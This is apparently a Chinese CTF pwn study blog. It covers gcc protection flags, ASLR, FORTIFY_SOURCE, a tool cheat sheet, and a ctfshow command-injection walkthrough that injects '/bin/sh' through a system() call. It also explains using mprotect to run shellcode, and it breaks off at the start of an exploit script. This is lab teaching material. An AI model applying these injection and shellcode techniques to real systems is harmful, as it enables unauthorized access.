可以让新的命令完全替代当前的 shell 进程，而不仅仅是作为一个子进程运行。</p><p>exec [选项] 命令 [参数…]</p><p>当获得一个shell后可使用exec执行特定命令：</p><p>程序给了我们一个shell但是不是交互式的我们可以使用了exec函数来执行sh命令，并使用1&gt;&amp;0来进行输出重定向，即<code>exec sh 1&gt;&amp;0</code>这个命令将标准输出重定向到标准输入，实际上就是将命令的输出发送到后续命令的输入。具体来说，1&gt;&amp;0中的1表示标准输出，0表示标准输入。通过将标准输出重定向到标准输入，可以实现将命令的输出作为后续命令的输入。这样可以在执行sh命令后，进入一个交互式的Shl环境，可以在该环境中执行命令并与用户进行交互。<br>也可以直接exec cat&#x2F;ctf* 1&gt;&amp;0将cat&#x2F;ctf*命令的输出发送到标准输入，<strong>实际上就是将命令的输</strong><br><strong>出再次输出到屏幕上。</strong></p><h2 id="编译与链接"><a href="#编译与链接" class="headerlink" title="编译与链接"></a>编译与链接</h2><p>在编译和链接命令中，<code>-o</code> 是一个常用的选项，用于指定输出文件的名称。</p><h3 id="nasm"><a href="#nasm" class="headerlink" title="nasm"></a>nasm</h3><p>nasm是一种汇编语言编译器，用于将低级的汇编代码转换成机器码。它支持多种输出格式，包括但不限于ELF、COFF和二进制文件等。</p><p>利用nasm将.asm(文本文件)编译成ELF格式的.o(对象文件): </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf flag.asm -o flag.o</span><br></pre></td></tr></table></figure><ul><li><code>-f elf</code>: 指定输出文件的格式为ELF（Executable and Linkable Format），这是Linux系统常用的二进制文件格式。</li><li><code>flag.asm</code>: 输入的汇编源代码文件。</li><li><code>-o flag.o</code>: 指定输出的文件名为 <code>flag.o</code>，这是一个对象文件。</li></ul><h3 id="ld"><a href="#ld" class="headerlink" title="ld"></a>ld</h3><p>ld为链接器，用于将对象文件链接成一个可执行文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld -m elf_i386 -o flag flag.o</span><br></pre></td></tr></table></figure><ul><li><code>-m elf_i386</code>: 指定目标架构为i386（即32位x86架构）。这确保生成的可执行文件适用于32位系统。</li><li><code>-o flag</code>: 指定输出的可执行文件名为 <code>flag</code>。</li><li><code>flag.o</code>: 输入的对象文件。</li></ul><h2 id="常见的-gdb-命令："><a href="#常见的-gdb-命令：" class="headerlink" title="常见的 gdb 命令："></a>常见的 gdb 命令：</h2><h3 id="启动程序"><a href="#启动程序" class="headerlink" title="启动程序"></a>启动程序</h3><p>gdb</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="查看当前进程的虚拟内存映射"><a href="#查看当前进程的虚拟内存映射" class="headerlink" title="查看当前进程的虚拟内存映射"></a>查看当前进程的虚拟内存映射</h3><p>这将显示程序的各个内存段及其地址范围、权限等信息。</p><p>gdb</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmmap</span><br></pre></td></tr></table></figure><h2 id="寄存器及寻址方式"><a href="#寄存器及寻址方式" class="headerlink" title="寄存器及寻址方式"></a>寄存器及寻址方式</h2><h3 id="汇编指令与寄存器"><a href="#汇编指令与寄存器" class="headerlink" title="汇编指令与寄存器"></a>汇编指令与寄存器</h3><ul><li>mov：将值从一个寄存器移动到另一个寄存器或内存地址。</li><li>push：将寄存器的值压入栈中，ESP&#x2F;ESP减少。</li><li>pop：从栈中弹出值到寄存器，ESP&#x2F;ESP增加。</li><li>call：调用函数，将返回地址压入栈中。</li><li>ret：从函数返回，从栈中弹出返回地址到EIP&#x2F;RIP。</li></ul><h3 id="立即寻址方式"><a href="#立即寻址方式" class="headerlink" title="立即寻址方式"></a>立即寻址方式</h3><p>​    mov eax, 11         ; 将11赋值给eax<br>​    add eax, 114504     ; eax加上114504<br>​    sub eax, 1          ; eax减去1</p><p>最后eax的值为11+114504-1&#x3D;114514</p><h3 id="寄存器寻址方式"><a href="#寄存器寻址方式" class="headerlink" title="寄存器寻址方式"></a>寄存器寻址方式</h3><p>​    mov ebx, 0x36d      ; 将0x36d赋值给ebx<br>​    mov edx, ebx        ; 将ebx的值赋值给edx</p><h3 id="直接寻址方式（存地址）"><a href="#直接寻址方式（存地址）" class="headerlink" title="直接寻址方式（存地址）"></a>直接寻址方式（存地址）</h3><p>​    mov ecx, msg      ; 将msg的地址赋值给ecx </p><p>eg：mov     ecx, dword_80490E8 </p><p><em><code>dword_80490E8</code> 是一个 32 位的双字（double word），其值是一个内存地址。这条指令的作用是<strong>将内存地址 0x80490E8 直接赋值给寄存器 ecx</strong>。这意味着 ecx 现在存储的是这个地址本身，而不是该地址所指向的数据。</em></p><h3 id="寄存器间接寻址方式（存对应地址上所对应的值）"><a href="#寄存器间接寻址方式（存对应地址上所对应的值）" class="headerlink" title="寄存器间接寻址方式（存对应地址上所对应的值）"></a>寄存器间接寻址方式（存对应地址上所对应的值）</h3><p>​    mov esi, msg        ; 将msg的地址赋值给esi<br>​    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</p><p><em>方括号 <code>[ ]</code> 表示间接寻址，即访问的是括号内表达式所指向的内存<strong>地址中的内容</strong>，而不是表达式本身。</em></p><p>.data:080490E8 57 65 6C 63                   dword_80490E8 dd 636C6557h   *这段代码表示的是在地址 <code>080490E8</code> 处的数据段中定义了一个双字（dword）变量 <code>dword_80490E8</code>，其值为 <code>636C6557h</code>*其中h为汇编中表示16进制数的后缀</p><h3 id="寄存器相对寻址方式"><a href="#寄存器相对寻址方式" class="headerlink" title="寄存器相对寻址方式"></a><em>寄存器相对寻址方式</em></h3><p>​    mov ecx, msg        ; 将msg的地址赋值给ecx<br>​    add ecx, 4          ; 将ecx 寄存器中的值增加4（地址加4）<br>​    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</p><h3 id="基址变址寻址方式"><a href="#基址变址寻址方式" class="headerlink" title="基址变址寻址方式"></a>基址变址寻址方式</h3><p>​    mov ecx, msg        ; 将msg的地址赋值给ecx<br>​    mov edx, 2          ; 将2赋值给edx<br>​    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</p><h3 id="相对基址变址寻址方式"><a href="#相对基址变址寻址方式" class="headerlink" title="相对基址变址寻址方式"></a>相对基址变址寻址方式</h3><p>​    mov ecx, msg        ; 将msg的地址赋值给ecx<br>​    mov edx, 1          ; 将1赋值给edx<br>​    add ecx, 8          ; 将ecx加上8<br>​    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</p><h2 id="gcc编译文件"><a href="#gcc编译文件" class="headerlink" title="gcc编译文件"></a>gcc编译文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o hello hello.c</span><br><span class="line">gcc flag.s -o flag</span><br></pre></td></tr></table></figure><h3 id="关闭所有保护："><a href="#关闭所有保护：" class="headerlink" title="关闭所有保护："></a>关闭所有保护：</h3><ol><li><p>**<code>-fno-stack-protector</code>**：</p><ul><li>禁用堆栈保护器（Stack Protector），防止在函数调用中插入额外的检查代码。</li></ul></li><li><p>**<code>-z execstack</code>**：</p></li></ol><ul><li>允许堆栈执行，禁用 NX 位（No-eXecute）保护。</li></ul><ol start="3"><li><p>**<code>-Wl,-z,norelro</code>**：</p><ul><li>禁用只读重定位表（RELRO），使数据段不被标记为只读。</li></ul></li><li><p>**<code>-D_FORTIFY_SOURCE=0</code>**：</p></li></ol><ul><li>禁用源代码级别的安全强化功能。</li></ul><ol start="5"><li>**<code>-no-pie</code>**：</li></ol><ul><li>禁用位置独立代码（PIE），生成非位置独立的可执行文件，不利于 ASLR 的有效性。</li></ul><h3 id="开启所有保护："><a href="#开启所有保护：" class="headerlink" title="开启所有保护："></a>开启所有保护：</h3><ul><li>**<code>-fstack-protector-all</code>**：启用全面的堆栈保护器。</li><li>**<code>-z relro</code>**：启用部分 RELRO。</li><li>**<code>-z now</code>**：启用完全 RELRO。</li><li>**<code>-D_FORTIFY_SOURCE=2</code>**：启用源代码级别的强化。</li><li>**<code>-pie</code>**：生成位置独立的可执行文件（PIE），有助于 ASLR。</li><li>**<code>-Wl,-z,noexecstack</code>**：确保堆栈不可执行（默认情况下通常是这样的）。</li></ul><h2 id="命令注入获取shell"><a href="#命令注入获取shell" class="headerlink" title="命令注入获取shell"></a>命令注入获取shell</h2><p>下面这段为连上靶机后执行的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">How much do you know about Linux commands? </span><br><span class="line"></span><br><span class="line">1.id</span><br><span class="line">2.ls</span><br><span class="line">3.cat /ctfshow_flag</span><br><span class="line">4.su</span><br><span class="line">5.exit</span><br><span class="line"></span><br><span class="line">Enter the command you want choose:(1.2.3.4 or 5)</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">Which directory?(&#x27;/&#x27;,&#x27;./&#x27; or the directiry you want?)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用；分隔ls并根据下方源码中的获取输入的漏洞送&#x2F;bin&#x2F;sh进去，如果不用；分隔则只会尝试列出&#x2F;bin&#x2F;sh目录。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Which directory?(&#x27;/&#x27;,&#x27;./&#x27; or the directiry you want?)&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0xA</span>uLL);</span><br><span class="line">        <span class="built_in">strcat</span>(dest, buf);</span><br><span class="line">        system(dest);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Execution succeeded!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>当输入2时会执行上面的代码，其中read获取输入，0xAuLL对应十进制值为10故最多可输入10个字节，strcat将buf的值赋值给dest，dest又在system中故可输入&#x2F;bin&#x2F;sh获取shell。</p><p>；为分隔command1;command;command三条指令会按照顺序执行，并且前面的指令执行是否成功不会影响后边指令的执行。</p><p>command1&amp;command 两条指令会在后台同时执行。</p><h2 id="文件输出流"><a href="#文件输出流" class="headerlink" title="文件输出流"></a>文件输出流</h2><p>文件输出流（File Output Stream）是一种用于将数据写入到文件中的输入&#x2F;输出流，</p><ul><li><p><strong>基本功能</strong>：文件输出流主要用于创建新文件或将数据追加到现有文件。</p></li><li><p><strong>工作原理</strong>：当你创建一个文件输出流对象并指定目标文件后，你可以通过该对象的方法来写入数据。这些方法包括 <code>write</code> 方法，可以接受单个字节或字节数组作为参数。</p></li></ul><p><strong>关闭输出流</strong>是一个非常重要的步骤，它确保了所有缓冲的数据都被正确地写入到目标文件，并且释放了系统资源。具体来说，关闭输出流会有以下几个效果：</p><ol><li><strong>刷新缓冲区</strong>：如果输出流有内部缓冲区（大多数情况下都有），关闭流会强制将缓冲区中的所有未写入数据写入到目标文件中。这确保了没有任何数据丢失。</li><li><strong>释放资源</strong>：操作系统对打开的文件描述符数量有限制。如果不及时关闭输出流，可能会导致资源泄露，最终耗尽可用的文件描述符，从而影响程序的正常运行。</li><li><strong>防止数据损坏</strong>：在某些情况下，不关闭输出流可能导致数据部分写入或完全未写入，从而造成数据损坏或不完整。</li><li><strong>提高性能</strong>：及时关闭不再需要的输出流可以减少不必要的内存占用和系统开销，有助于提高程序的整体性能。</li><li><strong>异常处理</strong>：即使在发生异常的情况下，也应该尽量关闭输出流。使用 try-with-resources 语句可以自动管理资源的关闭，简化代码并减少错误发生的可能性。</li></ol><h2 id="设置ALSR保护参数"><a href="#设置ALSR保护参数" class="headerlink" title="设置ALSR保护参数"></a>设置ALSR保护参数</h2><p>ASLR(Address Space Layout Randomization)是一种操作系统级别的安全保护机制，旨在增加软件系统的安全性。它通过随机化程序在内存中的布局，使得攻击者难以准确地确定关键代码和数据的位置，从而增加了利用软件漏洞进行攻击的难度。</p><p><strong>开启不同等级会有不同的效果：</strong><br>1.内存布局随机化：ASLR的主要目标是随机化程序的内存布局。在传统的内存布局中，不同的库和模块通常会在固定的内存位置上加载，攻击者可以利用这种可预测性来定位和利用漏洞。ASLR通过随机化这些模块的加载地址，使得攻击者无法准确地确定内存中的关键数据结构和<br>代码的位置。<br>2.地址空间范围的随机化：ASLR还会随机化进程的地址空间范围。在传统的地址空间中，栈、堆、代码段和数据段通常会被分配到固定的地址范围中。ASLR会随机选择地址空间的起始位置和大小，从而使得这些重要的内存区域在每次运行时都有不同的位置。<br>3.随机偏移量：ASLR会引入随机偏移量，将程序和模块在内存中的相对位置随机化。这意味着每个模块的实际地址是相对于一个随机基址偏移的，而不是绝对地址。攻击者需要在运行时发现这些偏移量，才能准确地定位和利用漏洞。<br>4.堆和栈随机化：ASLR也会对堆和栈进行随机化。堆随机化会在每次分配内存时选择不同的起始地址，使得攻击者无法准确地预测堆上对象的位置。栈随机化会随机选择栈帧的起始位置，使得攻击者无法轻易地覆盖返回地址或控制程序流程。</p><p>在linux中，ALSR的全局配置&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space(这是一个用于控制地址随机化的文件)有三种情况</p><p><img src="/../images/show%E5%89%8D%E7%BD%AE/ALSR.png" alt="1"></p><p>修改一个文件的ASLR：</p><p>首先将终端目录定位到文件，或者直接在文件处打开终端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/sys/kernel/randomize_va_space </span><br><span class="line"><span class="comment">#查看当前ASLR的操作数</span></span><br><span class="line"><span class="built_in">sudo</span> sh -c <span class="string">&#x27;echo 1 &gt; /proc/sys/kernel/randomize_va_space&#x27;</span></span><br><span class="line"><span class="comment">#将此文件的ASLR操作数改为0</span></span><br><span class="line"><span class="comment">#此处sh-c是为了在子shell中执行命令，这样sudo会为整个命令提供超级用户权限</span></span><br></pre></td></tr></table></figure><p>在未开启PIE的情况下不论ASLR操作数是多少函数的地址都不会改变。</p><p><strong>地址空间布局随机化（Address Space Layout Randomization, ASLR）和位置无关可执行文件（Position-Independent Executable, PIE）是两个重要的安全机制。</strong></p><h2 id="FORTIFY-SOURCE保护"><a href="#FORTIFY-SOURCE保护" class="headerlink" title="FORTIFY_SOURCE保护"></a>FORTIFY_SOURCE保护</h2><p>FORTIFY_SOURCE 是一个 C&#x2F;C++ 编译器提供的安全保护机制，旨在防止缓冲区溢出和其他与字符串和内存操作相关的安全漏洞。它是在编译时自动插入的一组额外代码，用于增强程序对于缓冲区溢出和其他常见安全问题的防护。</p><p>FORTIFY_SOURCE 提供了以下主要功能：</p><ol><li><p>运行时长度检查：FORTIFY_SOURCE 会在编译时自动将长度检查代码插入到一些危险的库函数中，例如strcpy、strcat、sprintf等。这些代码会检查目标缓冲区的长度，以确保操作不会导致溢出。如果检测到溢出情况，程序会立即终止，从而防止潜在的漏洞利用。</p></li><li><p>缓冲区溢出检测：FORTIFY_SOURCE 还会将额外的保护机制添加到一些敏感的库函数中，例如memcpy、memmove、memset等。这些机制可以检测传递给这些函数的源和目标缓冲区是否有重叠，并防止潜在的缓冲区溢出。</p></li><li><p>安全警告和错误报告：当 FORTIFY_SOURCE 检测到潜在的缓冲区溢出或其他安全问题时，它会生成相应的警告和错误报告。</p></li></ol><p>当FORTIFY_SOURCE&#x3D;0时 禁用Fortify功能，不会进行额外检查</p><p>当FORTIFY_SOURCE&#x3D;1时 启用 Fortify 功能的基本级别。 在编译时进行一些安全检查，如缓冲区边界检查、格式化字符串检查等。 在运行时进行某些检查，如检测函数返回值和大小的一致性。 如果检测到潜在的安全问题，会触发运行时错误，并终止程序执行。</p><p>格式化字符串%2$x和%n依旧可用</p><p>当FORTIFY_SOURCE&#x3D;2时：启用 Fortify 功能的高级级别。 包括基本级别的安全检查，并添加了更多的检查。 在编译时进行更严格的检查，如更精确的缓冲区边界检查。 提供更丰富的编译器警告和错误信息。</p><p>格式化字符串%n也无法利用了，而%N$也要从%1$开始连续才可用</p>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇总</title>
      <link href="/2024/12/09/%E6%B1%87%E6%80%BB/"/>
      <url>/2024/12/09/%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此篇文章是因为平时找一些指令要到处翻文章感觉有点麻烦就做了一些知识点的小汇总。</p><p>内容包括Linux指令、找ROPgadget指令、64位程序传参寄存器、GDB调试….，pwntools单独放在另一篇文章了感兴趣的师傅可以在博客主页翻翻看</p><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 域名 端口号</span><br></pre></td></tr></table></figure><p>nc用于连接远程靶机，是Linux中的一个网络工具(还有很多其他用法但不常用就不列举了)</p><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh 用户名@题目地址 -p题目端口号</span><br></pre></td></tr></table></figure><p>ssh是一种网络协议，用于安全的远程登录到计算机系统</p><h3 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p>ls用于列出当前工作目录下的文件或子目录</p><h3 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> 目标路径</span><br></pre></td></tr></table></figure><h3 id="pwd列目录"><a href="#pwd列目录" class="headerlink" title="pwd列目录"></a>pwd列目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure><p>pwd显示当前工作目录的内容</p><h3 id="chown程序提权"><a href="#chown程序提权" class="headerlink" title="chown程序提权"></a>chown程序提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 777 文件名</span><br></pre></td></tr></table></figure><p>该指令用于将程序变为可读可写可执行，即改变程序的权限</p><h3 id="file查看文件类型"><a href="#file查看文件类型" class="headerlink" title="file查看文件类型"></a>file查看文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file 文件名</span><br></pre></td></tr></table></figure><p><img src="/../images/%E6%B1%87%E6%80%BB/file.png" alt="1"></p><p>dynamically linked为动态链接</p><p>static Linking为静态链接</p><h3 id="AWDP修复后文件上传"><a href="#AWDP修复后文件上传" class="headerlink" title="AWDP修复后文件上传"></a>AWDP修复后文件上传</h3><p>国赛半决打了第一次AWDP结果看不懂怎么传防御了的文件其中涉及一个update.sh文件</p><blockquote><p>update.sh   是一个常见的脚本文件名，通常用于 Linux 或类 Unix 系统中。它的扩展名   .sh   表示这是一个 Shell 脚本文件，即用 Shell 编程语言编写的脚本。Shell 脚本是一种用于自动化任务的脚本语言，通常用于执行一系列命令、管理文件和目录、配置系统设置等。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 !#/bin/sh                                                                   </span><br><span class="line">2 <span class="built_in">chmod</span> +x pwn</span><br><span class="line">3 <span class="built_in">mv</span> pwn /home/ctf/pwn</span><br></pre></td></tr></table></figure><p>压缩文件命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf update.tar.gz pwn update.sh</span><br></pre></td></tr></table></figure><h2 id="虚拟机连不上网？"><a href="#虚拟机连不上网？" class="headerlink" title="虚拟机连不上网？"></a>虚拟机连不上网？</h2><p>多半是DNS(域名系统)出问题了</p><p>一般我习惯吧DNS设置成8.8.8.8(谷歌的公开提供的公共服务器之一)</p><p>当虚拟机连不上网，打不开浏览器先尝试<code>ping 8.8.8.8</code>测试主机之间的连通性(检查网路连接的状态与质量)</p><p><img src="/../images/%E6%B1%87%E6%80%BB/ping.png" alt="1"></p><p>网络正常的话是这样</p><p>不正常的话用这个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim /etc/resolv.conf</span><br></pre></td></tr></table></figure><p>以管理员权限用vim修改&#x2F;etc&#x2F;resolv.conf这个位置的文件</p><p><img src="/../images/%E6%B1%87%E6%80%BB/vim.png" alt="1"></p><p>将127.0.0.53修改为8.8.8.8即可(具体原理还没明白)</p><p>更改后重启网络服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl restart NetworkManager</span><br></pre></td></tr></table></figure><h3 id="vim文本编辑器"><a href="#vim文本编辑器" class="headerlink" title="vim文本编辑器"></a>vim文本编辑器</h3><p><code>a</code>切换为插入模式</p><p><code>:w</code>：保存文件</p><p><code>:q</code>：退出 Vim</p><p><code>:wq</code> 或 <code>ZZ</code>：保存并退出</p><p><code>:q!</code>：不保存强制退出</p><p>还有很多但是最近只用得到这些就不一一列出了</p><h2 id="ROPgadget查找"><a href="#ROPgadget查找" class="headerlink" title="ROPgadget查找"></a>ROPgadget查找</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;rdi&#x27;</span> <span class="comment">#控制寄存器的值</span></span><br><span class="line">ROPgadget --binary pwn --string <span class="string">&#x27;/bin/sh&#x27;</span> <span class="comment">#查找字符串</span></span><br><span class="line">ROPgadget --binary pwn --only <span class="string">&#x27;leave|ret&#x27;</span> | grep <span class="string">&#x27;leave&#x27;</span>#查找leave ret指令地址</span><br><span class="line">ROPgadget --binary pwn --ropchain<span class="comment">#生成现成的rop利用链直接getshell适用于静态编译的程序</span></span><br><span class="line">ROPgadget --binary pwn --only <span class="string">&#x27;ret&#x27;</span><span class="comment">#查找ret指令的地址</span></span><br><span class="line">ROPgadget --binary pwn --offset <span class="comment">#查看每个gadget在二进制文件中的偏移地址</span></span><br><span class="line">ROPgadget --binary pwn --no-syscalls <span class="comment">#只看主程序的gadget忽略动态链接库中的gadget</span></span><br></pre></td></tr></table></figure><p>对第一条指令详细解释：</p><p><strong><code>ROPgadget --binary pwn --only &#39;pop|ret&#39;</code></strong></p><ul><li><code>--binary pwn</code>：指定要分析的二进制文件为 <code>pwn</code>。</li><li><code>--only &#39;pop|ret&#39;</code>：只显示包含 <code>pop</code> 或 <code>ret</code> 指令的 gadget。</li></ul><p><strong><code>| grep &#39;rdi&#39;</code></strong></p><ul><li><code>|</code>：管道符，将前一个命令的输出作为下一个命令的输入。</li><li><code>grep &#39;rdi&#39;</code>：从上一步的输出中筛选出包含 <code>rdi</code> 的行。</li></ul><h2 id="沙盒查询"><a href="#沙盒查询" class="headerlink" title="沙盒查询"></a>沙盒查询</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./pwn</span><br></pre></td></tr></table></figure><h2 id="64位程序的传参寄存器"><a href="#64位程序的传参寄存器" class="headerlink" title="64位程序的传参寄存器"></a>64位程序的传参寄存器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">具体64位传参方法如下：</span><br><span class="line">当参数少于7个时，参数从左到右放入寄存器：rdi,rsi,rdx,rcx,r8,r9</span><br><span class="line">当参数为7个以上时，前6个与前面一样，但后面的依次从“右向左”放入栈中，和32位汇编一样</span><br></pre></td></tr></table></figure><h2 id="GDB调试"><a href="#GDB调试" class="headerlink" title="GDB调试"></a>GDB调试</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb pwn #开始调试</span><br><span class="line">b 函数名 #在指定函数处打断点</span><br><span class="line">b *地址 #在指定位置处设置断点</span><br><span class="line">n     #c语言级的断点定位(走得快一点)</span><br><span class="line">ni    #汇编级别的断点定位(走得精细一点)</span><br><span class="line">s/si  #s与si的区别和n/ni相同,不同点在于s/si会进入函数内部</span><br><span class="line">fibi  #跳出函数</span><br><span class="line">r     #运行</span><br><span class="line">c     #让程序继续运行</span><br><span class="line">stack 30 #查看此时栈中的内容</span><br><span class="line">x\gx</span><br></pre></td></tr></table></figure><h1 id="ASCll表"><a href="#ASCll表" class="headerlink" title="ASCll表"></a>ASCll表</h1><p><img src="/../images/%E6%B1%87%E6%80%BB/ASCII.jpeg" alt="1"></p><p>&lt;待续…&gt;</p>]]></content>
      
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>静态链接之mprotect</title>
      <link href="/2024/12/09/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E4%B9%8Bmprotect/"/>
      <url>/2024/12/09/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E4%B9%8Bmprotect/</url>
      
        <content type="html"><![CDATA[<h1 id="静态链接之mprotect"><a href="#静态链接之mprotect" class="headerlink" title="静态链接之mprotect"></a>静态链接之mprotect</h1><p>这篇文章针对ctfshow上的49，50题</p><h2 id="什么是mprotect函数"><a href="#什么是mprotect函数" class="headerlink" title="什么是mprotect函数"></a>什么是mprotect函数</h2><p>meprotect函数可以用来修改指定内存页的权限为可读、可写、可执行。</p><p>大多可写的部分都不可执行，利用该函数修改后可传入shellcode来获取shell</p><p>函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* start,<span class="type">size_t</span> len,<span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure><p>第一个参数*start是指向需要进行操作的地址</p><p>第二个参数len是地址往后多大的长度</p><p>第三个参数port是要赋予的权限</p><p>区间开始的地址start必须是一个内存页的起始地址(地址的后三位为0，0x1000&#x3D;4096u)，指定的内存区间必须包含整个内存页(4KB&#x3D;4096B)</p><p>区间长度len必须是页大小的整数倍。</p><p>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值</p><p><strong>prot</strong>可以取一下几个值，并且可以用”|”将几个属性合起来使用：</p><ul><li>PROT_READ：表示内存段内的内容可写；</li><li>PROT_WRITE：表示内存段内的内容可读；</li><li>PROT_EXEC：表示内存段中的内容可执行；</li><li>PROT_NONE：表示内存段中的内容根本没法访问；</li><li><strong>prot&#x3D;7 是可读、可写、可执行</strong>7&#x3D;1+2+4(r:4 w:2 x:1)</li></ul><p>返回值：0；成功，-1；失败</p><p>gdb调试vmmap看段属性时r w x分别代表可读 可写 可执行</p><p><img src="/../images/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5/1.png" alt="1"></p><p>其中0x8048000-0x80d7000段权限为可读(r)可执行(x)</p><p>可以通过gdb调试输入<code>disass mprotect</code>查看mprotect函数对应的汇编代码从而确定其地址</p><p>也可以直接通过<code>elf.sym[&#39;mprotect&#39;]</code>来间接获取其地址</p><h2 id="例题pwn49"><a href="#例题pwn49" class="headerlink" title="例题pwn49"></a>例题pwn49</h2><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span 